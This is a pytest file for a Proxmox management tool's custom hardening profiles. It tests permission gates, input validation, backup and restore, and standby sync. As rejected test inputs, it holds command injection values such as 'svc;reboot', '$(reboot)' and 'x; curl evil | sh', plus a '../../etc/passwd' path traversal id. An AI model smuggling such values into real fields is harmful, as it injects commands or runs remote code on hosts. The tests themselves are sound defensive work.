"""Custom node hardening profiles (api/reports.py, core/manager.py).

A custom profile is a saved pick of the built-in controls plus values for the parameters
of the templated ones, never a command of its own. It lives in hardening_profiles, which
the standbys get with the sync. Checking a node with one takes node.maintenance like any
other profile; writing one also takes admin.settings and an account that no tenant or
cluster list limits.

Driven through the real Flask app (conftest `api`, `seed`) with a fake manager, except
where the manager's own command building is the point.
MK
"""
import io
import json
import re
import shutil
import subprocess

import pytest

from pegaprox.api import reports
from pegaprox.core.manager import PegaProxManager
from test_ha_core import env, _be_active, _be_standby, _wire  # noqa: F401  (env is a fixture)
from test_ha_forward import fwd, _forward_calls, _audit_rows, FROM_CLIENT, FORWARD  # noqa: F401
from test_ha_members import group, _built, URLS  # noqa: F401  (group is a fixture)
from test_sec_low_migrations import _ADMIN_PW, _BACKUP_PW, _admin_with_password

LIST = '/api/hardening/profiles'
CLUSTER, NODE = 'cluster_1', 'pve1'
CHECK = f'/api/clusters/{CLUSTER}/nodes/{NODE}/hardening'

GOOD = {
    'name': 'Web nodes',
    'description': 'Front end hosts\nbehind the proxy',
    'controls': ['backup_dns', 'ssh_perms', 'pam_faillock', 'ssh_perms'],
    'params': {'pam_faillock': {'service_user': 'svc_backup,deploy'},
               'backup_dns': {'dns1': '10.0.0.53', 'dns2': ''}},
}


def _root(api, seed, name='root'):
    return api.as_user(seed.user(name, role='admin'))


def _ops(api, seed):
    """Runs the hardening checks and nothing of the settings."""
    return api.as_user(seed.user('ops', role='user', permissions=['node.maintenance']))


def _make(client, **kw):
    r = client.post(LIST, json=dict(GOOD, **kw))
    assert r.status_code == 201, r.data
    return r.get_json()['profile']


def _rows(db):
    return [dict(r) for r in db.conn.execute('SELECT * FROM hardening_profiles ORDER BY id').fetchall()]


def _audit(db):
    return [r['action'] for r in (db.query('SELECT action FROM audit_log ORDER BY id') or [])
            if r['action'].startswith('hardening.')]


def _insert(db, pid, name, controls, params='{}'):
    db.conn.execute("INSERT INTO hardening_profiles (id, name, controls, params, created_at, updated_at) "
                    "VALUES (?, ?, ?, ?, '2026-10-30T08:00:00Z', '2026-10-30T08:00:00Z')",
                    (pid, name, controls, params))
    db.conn.commit()


def _fake(api, cluster_type='proxmox', answer=None):
    m = api.make_fake_manager(CLUSTER, cluster_type=cluster_type)
    m.is_connected = True
    m._effective_profile = PegaProxManager._effective_profile
    m.check_node_hardening.return_value = answer if answer is not None else {'ssh_perms': True}
    return api.set_manager(CLUSTER, m)


# -- saving, listing, changing, deleting ---------------------------------------------------------

def test_an_admin_saves_a_profile_and_a_maintenance_user_lists_it(api, seed):
    p = _make(_root(api, seed))
    assert re.fullmatch(r'[0-9a-f]{16}', p['id'])
    # deduplicated, in the order the check runs them
    assert p['controls'] == ['ssh_perms', 'pam_faillock', 'backup_dns']
    # an empty value is no value: the default stays
    assert p['params'] == {'pam_faillock': {'service_user': 'svc_backup,deploy'},
                           'backup_dns': {'dns1': '10.0.0.53'}}
    assert p['description'] == 'Front end hosts\nbehind the proxy'
    assert p['dropped_controls'] == [] and p['created_by'] == 'root'
    assert _audit(seed.db) == ['hardening.profile_created']

    body = _ops(api, seed).get(LIST).get_json()
    assert body['can_manage'] is False
    mine = body['custom'] == [{k: v for k, v in p.items() if k not in ('created_by', 'updated_by')}]
    assert mine, body['custom']

    body = _root(api, seed, 'root2').get(LIST).get_json()
    assert body['can_manage'] is True and body['custom'][0]['created_by'] == 'root'


def test_the_list_names_the_builtin_profiles_and_the_catalog(api, seed):
    body = _ops(api, seed).get(LIST).get_json()
    catalog = PegaProxManager._all_hardening_controls()

    builtin = {b['id']: b['controls'] for b in body['builtin']}
    assert set(builtin) == set(PegaProxManager._HARDENING_PROFILES)
    assert builtin['cis-l1'] == list(PegaProxManager.CIS_CHECKS)
    assert set(builtin['vs-nfd']) == PegaProxManager._HARDENING_PROFILES['vs-nfd']
    assert 'vsnfd_secure_boot' in builtin['vs-nfd']

    entries = {e['id']: e for e in body['catalog']}
    assert list(entries) == list(catalog)
    assert entries['backup_dns'] == {'id': 'backup_dns', 'templated': True,
                                     'param_keys': ['dns1', 'dns2'],
                                     'defaults': {'dns1': '1.1.1.1', 'dns2': '9.9.9.9'},
                                     'rollback': bool(catalog['backup_dns'].get('backup_files'))}
    assert entries['ssh_perms']['templated'] is False and entries['ssh_perms']['param_keys'] == []
    assert entries['ssh_crypto']['rollback'] is True
    assert body['format'] == 'pegaprox-hardening-profile' and body['format_version'] == 1


def test_a_change_keeps_what_the_body_leaves_out(api, seed):
    admin = _root(api, seed)
    p = _make(admin)

    r = admin.put(f"{LIST}/{p['id']}", json={'name': 'Web front ends'})
    assert r.status_code == 200, r.data
    assert r.get_json()['changed'] == ['name']
    q = r.get_json()['profile']
    assert (q['controls'], q['params'], q['description']) == (p['controls'], p['params'], p['description'])

    # pam_faillock leaves the profile: its value goes with it, the other stays
    r = admin.put(f"{LIST}/{p['id']}", json={'controls': ['ssh_perms', 'backup_dns']})
    assert r.status_code == 200, r.data
    assert r.get_json()['profile']['params'] == {'backup_dns': {'dns1': '10.0.0.53'}}

    # nothing changed, nothing written
    before = _rows(seed.db)
    r = admin.put(f"{LIST}/{p['id']}", json={'name': 'Web front ends'})
    assert r.status_code == 200 and r.get_json()['changed'] == []
    assert _rows(seed.db) == before
    assert _audit(seed.db) == ['hardening.profile_created'] + ['hardening.profile_updated'] * 2


def test_delete_and_the_ids_it_answers_for(api, seed):
    admin = _root(api, seed)
    p = _make(admin)
    for bad in ('0123456789abcdeg', 'ABCDEF0123456789', '..', p['id'] + '0'):
        assert admin.put(f'{LIST}/{bad}', json={'name': 'x'}).status_code == 404
        assert admin.delete(f'{LIST}/{bad}').status_code == 404
    assert len(_rows(seed.db)) == 1

    r = admin.delete(f"{LIST}/{p['id']}")
    assert r.status_code == 200 and r.get_json() == {'success': True, 'id': p['id']}
    assert _rows(seed.db) == []
    assert admin.delete(f"{LIST}/{p['id']}").status_code == 404
    assert admin.put(f"{LIST}/{p['id']}", json={'name': 'back'}).status_code == 404
    assert _audit(seed.db) == ['hardening.profile_created', 'hardening.profile_deleted']


def test_an_exported_profile_comes_back_in(api, seed):
    admin = _root(api, seed)
    p = _make(admin)
    exported = {'format': 'pegaprox-hardening-profile', 'version': 1, 'name': 'Web nodes (copy)',
                'description': p['description'], 'controls': p['controls'], 'params': p['params'],
                'id': p['id'], 'created_by': 'someone'}
    r = admin.post(LIST, json=exported)
    assert r.status_code == 201, r.data
    q = r.get_json()['profile']
    assert q['id'] != p['id'] and q['created_by'] == 'root'
    assert (q['controls'], q['params']) == (p['controls'], p['params'])


# -- what a profile may hold ---------------------------------------------------------------------

REJECTED = [
    ('no name', {'name': ''}),
    ('a blank name', {'name': '   '}),
    ('a name that is not text', {'name': 5}),
    ('a name over 64', {'name': 'n' * 65}),
    ('a bell in the name', {'name': 'web\x07nodes'}),
    ('a line break in the name', {'name': 'web\nnodes'}),
    ('a C1 control in the name', {'name': 'web\x85nodes'}),
    ('a bidi override in the name', {'name': 'web\u202enodes'}),
    # nothing that shows, or a character that does not
    ('a zero width space for a name', {'name': '\u200b'}),
    ('a zero width space in the name', {'name': 'web\u200bnodes'}),
    ('a direction mark in the name', {'name': 'web\u200enodes'}),
    ('a joiner in the name', {'name': 'web\u200dnodes'}),
    ('a byte order mark in the name', {'name': '\ufeffweb'}),
    ('a Hangul filler for a name', {'name': '\u3164'}),
    ('braille blanks for a name', {'name': '\u2800\u2800'}),
    ('a lone combining mark for a name', {'name': '\u0301'}),
    # half of a surrogate pair from a JSON escape; the INSERT would refuse it with a 500
    ('a lone surrogate in the name', {'name': 'Web \ud83d'}),
    ('a lone surrogate in the description', {'description': 'x\udc00'}),
    ('a description over 500', {'description': 'd' * 501}),
    ('a tab in the description', {'description': 'a\tb'}),
    ('a description that is not text', {'description': ['x']}),
    ('no controls', {'controls': []}),
    ('controls that are no list', {'controls': 'ssh_perms'}),
    ('an unknown control', {'controls': ['ssh_perms', 'rm_rf_root']}),
    ('a control that is not text', {'controls': ['ssh_perms', 7]}),
    ('params that are no object', {'params': ['x']}),
    ('values for a control not picked', {'params': {'session_limit': {'service_user': 'svc'}}}),
    ('values for a control without parameters', {'controls': ['ssh_perms'],
                                                  'params': {'ssh_perms': {'x': '1'}}}),
    ('a parameter the control does not have', {'params': {'backup_dns': {'dns3': '1.1.1.1'}}}),
    ('values that are no object', {'params': {'backup_dns': '1.1.1.1'}}),
    ('a value that is not text', {'params': {'backup_dns': {'dns1': 53}}}),
    ('a value over 256', {'params': {'pam_faillock': {'service_user': ','.join(['u' * 32] * 7 + ['u' * 26])}}}),
    ('a shell separator', {'params': {'pam_faillock': {'service_user': 'svc;reboot'}}}),
    ('a command substitution', {'params': {'backup_dns': {'dns1': '$(reboot)'}}}),
    # each parameter takes its own kind of value
    ('user names for a DNS server', {'params': {'backup_dns': {'dns1': 'deploy'}}}),
    ('colons for a DNS server', {'params': {'backup_dns': {'dns2': ':::'}}}),
    ('an address for the service users', {'params': {'pam_faillock': {'service_user': '1.1.1.1'}}}),
    ('a quote', {'params': {'pam_faillock': {'service_user': 'svc"'}}}),
    ('a foreign file', {'format': 'something-else', 'version': 1}),
    ('a later export version', {'format': 'pegaprox-hardening-profile', 'version': 2}),
    ('a version that is a bool', {'format': 'pegaprox-hardening-profile', 'version': True}),
]


@pytest.mark.parametrize('why,change', REJECTED, ids=[r[0] for r in REJECTED])
def test_a_body_that_does_not_pass_changes_nothing(api, seed, why, change):
    admin = _root(api, seed)
    p = _make(admin, name='Kept')
    before, audit = _rows(seed.db), _audit(seed.db)

    r = admin.post(LIST, json=dict(GOOD, **change))
    assert r.status_code == 400, (why, r.data)
    assert r.get_json()['error']
    r = admin.put(f"{LIST}/{p['id']}", json=change)
    assert r.status_code == 400, (why, r.data)

    assert _rows(seed.db) == before and _audit(seed.db) == audit


def test_the_edges_that_pass(api, seed):
    admin = _root(api, seed)
    users = ','.join(['u' * 32] * 7 + ['u' * 25])
    assert len(users) == 256
    p = _make(admin, name='  ' + 'n' * 64 + '  ', description='d' * 499 + '\r\n',
              params={'pam_faillock': {'service_user': users}})
    assert p['name'] == 'n' * 64 and p['description'] == 'd' * 499
    assert p['params'] == {'pam_faillock': {'service_user': users}}
    assert _make(admin, name='Two', description=None, params=None)['params'] == {}
    # letters of any script, accents as combining marks and pictographs all show
    for name in ('Ärzte', 'Cafe\u0301', '\U0001f512 Web', '\u3164x'):
        assert _make(admin, name=name)['name'] == name


def test_a_name_is_taken_in_any_case(api, seed):
    admin = _root(api, seed)
    a = _make(admin, name='Web Nodes')
    b = _make(admin, name='Ärzte')
    for name in ('web nodes', '  WEB NODES  '):
        assert admin.post(LIST, json=dict(GOOD, name=name)).status_code == 409
    assert admin.post(LIST, json=dict(GOOD, name='ÄRZTE')).status_code == 409
    assert admin.put(f"{LIST}/{b['id']}", json={'name': 'WEB nodes'}).status_code == 409
    assert len(_rows(seed.db)) == 2
    # its own name in another case is no clash
    r = admin.put(f"{LIST}/{a['id']}", json={'name': 'WEB NODES'})
    assert r.status_code == 200 and r.get_json()['profile']['name'] == 'WEB NODES'


def test_at_most_a_hundred(api, seed):
    for i in range(reports.HP_MAX):
        _insert(seed.db, f'{i:016x}', f'p{i}', '["ssh_perms"]')
    r = _root(api, seed).post(LIST, json=GOOD)
    assert r.status_code == 409 and '100' in r.get_json()['error']
    assert len(_rows(seed.db)) == reports.HP_MAX


def test_an_unreadable_list_is_not_an_empty_one(api, seed, monkeypatch):
    """The cap and the name check read the stored list. A read that failed must not let a
    write through as if there were none."""
    admin = _root(api, seed)

    def broken(*a, **kw):
        raise RuntimeError('database is locked')
    monkeypatch.setattr(reports, '_hp_rows', broken)
    assert admin.post(LIST, json=GOOD).status_code == 503
    assert admin.get(LIST).status_code == 503
    monkeypatch.undo()
    assert _rows(seed.db) == []


# -- who may ---------------------------------------------------------------------------------------

@pytest.mark.parametrize('kind', ['maintenance_user', 'confined_settings_admin', 'capped_admin',
                                  'capped_default_admin', 'admins_viewer_token', 'viewer'])
def test_below_an_unconfined_settings_admin_nothing_is_written(api, seed, kind):
    seed.tenant('globex', ['cluster_globex'])
    p = _make(_root(api, seed))
    before = _rows(seed.db)
    headers = None
    if kind == 'maintenance_user':
        c = _ops(api, seed)
    elif kind == 'confined_settings_admin':
        # holds both permissions, in a tenant of its own
        c = api.as_user(seed.user('gxadmin', role='user', tenant_id='globex',
                                  permissions=['admin.settings', 'node.maintenance']))
    elif kind == 'capped_admin':
        c = api.as_user(seed.user('gx', role='admin', tenant_id='globex',
                                  tenant_permissions={'globex': {'role': 'user'}}))
    elif kind == 'capped_default_admin':
        c = api.as_user(seed.user('lowered', role='admin',
                                  tenant_permissions={'default': {'role': 'viewer'}}))
    elif kind == 'admins_viewer_token':
        from pegaprox.utils.auth import create_api_token
        res = create_api_token('root', 'ci', role='viewer')
        assert res.get('success'), res
        c, headers = api.anon(), {'Authorization': f"Bearer {res['token']}"}
    else:
        c = api.as_user(seed.user('watcher', role='viewer'))

    kw = {'headers': headers} if headers else {}
    for method, path, body in (('post', LIST, dict(GOOD, name='Mine')),
                               ('put', f"{LIST}/{p['id']}", {'name': 'Changed'}),
                               ('delete', f"{LIST}/{p['id']}", None)):
        r = getattr(c, method)(path, **(dict(kw, json=body) if body is not None else kw))
        assert r.status_code == 403, (kind, method, r.status_code, r.data)
    assert _rows(seed.db) == before

    r = c.get(LIST, **kw)
    if kind in ('maintenance_user', 'confined_settings_admin'):
        # they check nodes with the profiles, they do not manage them
        assert r.status_code == 200 and r.get_json()['can_manage'] is False
        assert 'created_by' not in r.get_json()['custom'][0]
    else:
        assert r.status_code == 403
    if kind == 'confined_settings_admin':
        r = c.post(LIST, json=dict(GOOD, name='Mine'))
        assert b'not limited' in r.data, r.data     # our gate, not the permission check


def test_a_tenant_operator_runs_them_on_the_clusters_of_its_tenant(api, seed):
    """Why the list is open to node.maintenance and not to the unconfined only: a tenant
    whose tenant owns a cluster checks and hardens its nodes, and the check and the apply
    take the profile's controls and values from that list."""
    seed.tenant('globex', ['cluster_globex'])
    p = _make(_root(api, seed))
    m = api.make_fake_manager('cluster_globex')
    m.is_connected = True
    m.check_node_hardening.return_value = {'ssh_perms': True}
    api.set_manager('cluster_globex', m)
    gx = api.as_user(seed.user('gxops', role='user', tenant_id='globex', permissions=['node.maintenance']))

    listed = gx.get(LIST).get_json()['custom']
    assert listed[0]['params'] == p['params']
    r = gx.get(f"/api/clusters/cluster_globex/nodes/{NODE}/hardening?profile=custom:{p['id']}")
    assert r.status_code == 200 and r.get_json()['profile_name'] == 'Web nodes', r.data
    assert m.check_node_hardening.call_args.kwargs['controls'] == p['controls']
    # and nowhere else
    _fake(api)
    assert gx.get(f"{CHECK}?profile=custom:{p['id']}").status_code in (403, 404)


def test_a_settings_admin_who_sees_everything_writes_them(api, seed):
    """Counterproof for the gate above: the bar is the scope and the permissions, not the
    admin role."""
    c = api.as_user(seed.user('delegate', role='user',
                              permissions=['admin.settings', 'node.maintenance']))
    p = _make(c)
    assert c.get(LIST).get_json()['can_manage'] is True
    assert c.delete(f"{LIST}/{p['id']}").status_code == 200


def test_a_write_without_the_xhr_marker_is_refused(api, seed):
    admin = _root(api, seed)
    r = api.app.test_client().post(LIST, json=GOOD, base_url='http://localhost',
                                   headers={'X-Session-ID': admin.session_id})
    assert r.status_code == 403 and 'CSRF' in r.get_json()['error']
    assert _rows(seed.db) == []


# -- checking a node with one ----------------------------------------------------------------------

def test_a_check_runs_exactly_the_profile(api, seed):
    admin = _root(api, seed)
    p = _make(admin)
    m = _fake(api, answer={'ssh_perms': True, 'pam_faillock': False, 'backup_dns': None})

    r = admin.get(f"{CHECK}?profile=custom:{p['id']}&verbose=0")
    assert r.status_code == 200, r.data
    kw = m.check_node_hardening.call_args.kwargs
    assert kw['controls'] == ['ssh_perms', 'pam_faillock', 'backup_dns'] and 'profile' not in kw
    body = r.get_json()
    assert body['profile'] == body['requested_profile'] == f"custom:{p['id']}"
    assert body['profile_name'] == 'Web nodes' and body['dropped_controls'] == []
    assert body['summary'] == {'total': 3, 'passed': 1, 'failed': 1, 'not_checked': 1, 'checked': 2}

    # a maintenance user checks with it too
    assert _ops(api, seed).get(f"{CHECK}?profile=custom:{p['id']}").status_code == 200
    # the built-in ones go as before
    assert admin.get(f'{CHECK}?profile=vs-nfd').status_code == 200
    assert m.check_node_hardening.call_args.kwargs == {'verbose': False, 'profile': 'vs-nfd'}


@pytest.mark.parametrize('profile', ['custom:', 'custom:0123456789abcdef', 'custom:../../etc',
                                     'custom:0123456789abcdef0', 'custom:%20', 'cust0m:abc'])
def test_an_unknown_custom_profile_is_refused(api, seed, profile):
    admin = _root(api, seed)
    m = _fake(api)
    r = admin.get(f'{CHECK}?profile={profile}')
    assert r.status_code == 400 and r.get_json()['error'].startswith('unknown profile')
    assert m.check_node_hardening.call_count == 0


def test_controls_this_version_does_not_know_are_skipped_and_named(api, seed):
    admin = _root(api, seed)
    _insert(seed.db, 'aaaaaaaaaaaaaaaa', 'From a later release', '["ssh_perms", "quantum_shield"]',
            '{"quantum_shield": {"x": "1"}}')
    _insert(seed.db, 'bbbbbbbbbbbbbbbb', 'Only new ones', '["quantum_shield"]')
    m = _fake(api)

    listed = {p['id']: p for p in admin.get(LIST).get_json()['custom']}
    assert listed['aaaaaaaaaaaaaaaa']['controls'] == ['ssh_perms']
    assert listed['aaaaaaaaaaaaaaaa']['dropped_controls'] == ['quantum_shield']
    assert listed['aaaaaaaaaaaaaaaa']['params'] == {}

    r = admin.get(f'{CHECK}?profile=custom:aaaaaaaaaaaaaaaa')
    assert r.status_code == 200, r.data
    assert m.check_node_hardening.call_args.kwargs['controls'] == ['ssh_perms']
    assert r.get_json()['dropped_controls'] == ['quantum_shield']

    r = admin.get(f'{CHECK}?profile=custom:bbbbbbbbbbbbbbbb')
    assert r.status_code == 400 and r.get_json()['dropped_controls'] == ['quantum_shield']
    assert m.check_node_hardening.call_count == 1


def test_a_custom_profile_is_for_proxmox_nodes(api, seed):
    admin = _root(api, seed)
    p = _make(admin)
    m = _fake(api, cluster_type='xcpng')
    r = admin.get(f"{CHECK}?profile=custom:{p['id']}")
    assert r.status_code == 400 and m.check_node_hardening.call_count == 0


def test_the_manager_sends_only_the_controls_it_was_given():
    """The command that goes over SSH holds a marker for each control it checks."""
    sent = []
    m = PegaProxManager.__new__(PegaProxManager)
    m._ssh_node_output = lambda node, cmd, timeout=60: (sent.append(cmd), "---END---")[1]

    out = m.check_node_hardening(NODE, profile='cis-l1', controls=['backup_dns', 'ssh_perms', 'nope'])
    assert set(out) == {'ssh_perms', 'backup_dns'}
    assert set(re.findall(r"echo '---(\w+)---'", sent[-1])) == {'ssh_perms', 'backup_dns', 'END'}
    # nothing to run sends nothing
    assert m.check_node_hardening(NODE, controls=['nope']) == {} and len(sent) == 1


# -- one rule for the values -----------------------------------------------------------------------

VALUES = [
    # the DNS servers of backup_dns take an IP address and nothing else
    ('dns1', '10.0.0.53', True), ('dns2', '2001:db8::53', True), ('dns1', ' 192.0.2.1 ', True),
    ('dns1', '::ffff:192.0.2.1', True), ('dns1', ':::', False), ('dns2', 'deploy', False),
    ('dns1', 'a', False), ('dns1', '.', False), ('dns1', '1.1.1', False), ('dns1', '1.1.1.1.1', False),
    ('dns1', '\u0661\u0662\u0663', False), ('dns1', '\u0661.\u0661.\u0661.\u0661', False),
    ('dns1', "fe80::1%x';reboot;'", False), ('dns1', 'fe80::1%eth0', False), ('dns2', "1.1.1.1'", False),
    # service_user takes Linux user names as a comma list
    ('service_user', 'svc_backup', True), ('service_user', 'svc_backup,deploy', True),
    ('service_user', '  deploy  ', True), ('service_user', '1.1.1.1', False),
    ('service_user', 'svc;reboot', False), ('service_user', '$(reboot)', False),
    ('service_user', 'svc backup', False), ('service_user', 'deploy\nreboot', False),
    ('service_user', "svc'", False), ('service_user', 'z' * 33, False), ('service_user', '-rf', False),
]


def _apply_cmd(control, key, value):
    sent = []
    m = PegaProxManager.__new__(PegaProxManager)
    m._ssh_node_output = lambda node, cmd, timeout=60: (sent.append(cmd), 'DONE')[1]
    m.apply_node_hardening(NODE, [control], params={control: {key: value}})
    return sent[-1]


@pytest.mark.parametrize('key,value,taken', VALUES)
def test_apply_and_a_saved_profile_take_the_same_values(api, seed, key, value, taken):
    """apply drops a value it may not use and keeps the default; saving one is refused.
    Both ask hardening_param_value, so the two cannot drift apart."""
    control = 'backup_dns' if key.startswith('dns') else 'pam_faillock'
    cmd = _apply_cmd(control, key, value)
    if control == 'backup_dns':
        used = dict(zip(('dns1', 'dns2'), re.findall(r"echo 'nameserver ([^']*)'", cmd)))[key]
        default = PegaProxManager.CIS_CHECKS['backup_dns']['defaults'][key]
    else:
        used, default = re.search(r'EXTRA_USERS="([^"]*)"', cmd).group(1), ''
    assert used == (value.strip() if taken else default), used

    r = _root(api, seed).post(LIST, json=dict(GOOD, params={control: {key: value}}))
    assert r.status_code == (201 if taken else 400), r.data
    if taken:
        assert r.get_json()['profile']['params'][control] == {key: value.strip()}


@pytest.mark.skipif(not shutil.which('bash') or not shutil.which('grep'), reason='no bash')
def test_backup_dns_looks_for_the_address_itself(tmp_path):
    """The apply adds a server unless resolv.conf has it. It used to look with a regex
    grep, which found 10.0.0.53 inside 110.0.0.53 (and a dot matches any character)."""
    conf = tmp_path / 'resolv.conf'
    conf.write_text('nameserver 110.0.0.53\n')
    cmd = _apply_cmd('backup_dns', 'dns1', '10.0.0.53').replace('/etc/resolv.conf', str(conf))
    p = subprocess.run(['bash', '-c', cmd], capture_output=True, text=True, timeout=10)
    assert p.stdout.strip() == 'DONE', p.stderr
    assert conf.read_text().splitlines() == ['nameserver 110.0.0.53', 'nameserver 10.0.0.53',
                                             'nameserver 9.9.9.9']
    # there already: nothing added
    conf.write_text('nameserver 10.0.0.53\n')
    subprocess.run(['bash', '-c', cmd], capture_output=True, text=True, timeout=10)
    assert conf.read_text().splitlines() == ['nameserver 10.0.0.53', 'nameserver 9.9.9.9']


# -- the config backup -----------------------------------------------------------------------------

def test_a_config_backup_carries_the_profiles_and_a_restore_brings_them_back(api, seed):
    import pegaprox.api.settings as settings_api
    admin = _admin_with_password(api, seed)
    kept = _make(admin)
    gone = _make(admin, name='Lab', controls=['journald'], params={})

    r = admin.post('/api/config/backup', json={'user_password': _ADMIN_PW, 'backup_password': _BACKUP_PW})
    assert r.status_code == 200, r.get_data(as_text=True)[:300]
    blob = r.get_data()
    plain = json.loads(settings_api._decrypt_backup(blob, _BACKUP_PW))
    assert {p['id']: p['name'] for p in plain['hardening_profiles']} == {kept['id']: 'Web nodes',
                                                                         gone['id']: 'Lab'}

    # since the backup: one deleted, one changed, one new that took a name from the backup
    seed.db.conn.execute('DELETE FROM hardening_profiles WHERE id = ?', (gone['id'],))
    seed.db.conn.commit()
    assert admin.put(f"{LIST}/{kept['id']}", json={'controls': ['ssh_perms']}).status_code == 200
    _make(admin, name='lab')

    r = admin.post('/api/config/restore', content_type='multipart/form-data',
                   data={'user_password': _ADMIN_PW, 'backup_password': _BACKUP_PW,
                         'backup_file': (io.BytesIO(blob), 'x.pegabackup')})
    assert r.status_code == 200, r.get_data(as_text=True)
    body = r.get_json()
    assert body['restored']['hardening_profiles'] == 1
    assert any('another profile is named' in e for e in body['errors']), body['errors']
    back = {p['id']: p for p in admin.get(LIST).get_json()['custom']}
    assert back[kept['id']]['controls'] == kept['controls'] and back[kept['id']]['params'] == kept['params']
    assert gone['id'] not in back


def test_a_restore_checks_each_profile_like_a_new_one(api, seed):
    admin = _root(api, seed)
    entries = [
        {'id': 'aaaaaaaaaaaaaaaa', 'name': 'Fine', 'controls': ['ssh_perms'], 'params': {}},
        {'id': 'bbbbbbbbbbbbbbbb', 'name': 'Smuggled', 'controls': ['pam_faillock'],
         'params': {'pam_faillock': {'service_user': 'x; curl evil | sh'}}},
        {'id': '../../etc/passwd', 'name': 'Bad id', 'controls': ['ssh_perms']},
        {'id': 'cccccccccccccccc', 'name': 'Nothing known', 'controls': ['quantum_shield']},
        'not an object',
    ]
    count, why = reports.restore_hardening_profiles(entries, 'root')
    assert count == 1 and len(why) == 4
    assert [r['id'] for r in _rows(seed.db)] == ['aaaaaaaaaaaaaaaa']
    # a dry run writes nothing
    count, _ = reports.restore_hardening_profiles(
        [{'id': 'dddddddddddddddd', 'name': 'Dry', 'controls': ['journald']}], 'root', dry_run=True)
    assert count == 1 and [r['id'] for r in _rows(seed.db)] == ['aaaaaaaaaaaaaaaa']
    assert admin.get(LIST).status_code == 200


def test_a_restore_leaves_out_text_the_database_cannot_hold(api, seed):
    entries = [{'id': 'aaaaaaaaaaaaaaaa', 'name': 'Fine', 'controls': ['ssh_perms']},
               {'id': 'bbbbbbbbbbbbbbbb', 'name': 'Bad \ud83d', 'controls': ['ssh_perms']},
               {'id': 'cccccccccccccccc', 'name': 'Also fine', 'description': 'x\udc00',
                'controls': ['journald']}]
    count, why = reports.restore_hardening_profiles(entries, 'root')
    assert count == 1 and len(why) == 2 and all('not valid text' in w for w in why), why
    assert [r['id'] for r in _rows(seed.db)] == ['aaaaaaaaaaaaaaaa']


def test_a_restore_that_fails_on_a_write_leaves_nothing_behind(api, seed):
    """The rows before the failed INSERT must not wait on the connection for the next
    commit (the restore's own audit line) while the result says none came back."""
    seed.db.conn.execute("CREATE TRIGGER hp_boom BEFORE INSERT ON hardening_profiles "
                         "WHEN NEW.name = 'Boom' BEGIN SELECT RAISE(ABORT, 'disk full'); END")
    seed.db.conn.commit()
    entries = [{'id': 'aaaaaaaaaaaaaaaa', 'name': 'Fine', 'controls': ['ssh_perms']},
               {'id': 'bbbbbbbbbbbbbbbb', 'name': 'Boom', 'controls': ['ssh_perms']}]
    with pytest.raises(Exception, match='disk full'):
        reports.restore_hardening_profiles(entries, 'root')
    seed.db.conn.commit()
    assert _rows(seed.db) == []


# -- the standbys ----------------------------------------------------------------------------------

def test_the_profiles_travel_with_the_sync(env, db):
    from pegaprox.core import ha
    _be_active()
    _insert(db, 'aaaaaaaaaaaaaaaa', 'On the active', '["ssh_perms"]')
    snap = _wire(ha.build_snapshot())
    assert 'hardening_profiles' in snap['tables']

    db.conn.execute('DELETE FROM hardening_profiles')
    _insert(db, 'bbbbbbbbbbbbbbbb', 'Only on the standby', '["journald"]')
    _be_standby()
    ha.apply_snapshot(snap)
    assert [(r['id'], r['name']) for r in _rows(db)] == [('aaaaaaaaaaaaaaaa', 'On the active')]


def test_a_standby_hands_a_profile_write_to_the_active(fwd, seed):
    g = fwd
    admin = _built(g, seed, 'b')
    g.calls.clear()
    with g.at('b'):
        r = admin.post(LIST, json=GOOD, headers=FROM_CLIENT)
        assert r.status_code == 201, r.data
        # the read is the standby's own copy, no call to the active
        assert admin.get(LIST).status_code == 200
    assert _forward_calls(g) == [('b', 'a', 'POST', FORWARD)]
    row = _audit_rows('hardening.profile_created')[-1]
    assert row['user'] == 'root' and row['details'].endswith(f"(via standby {URLS['b']})")
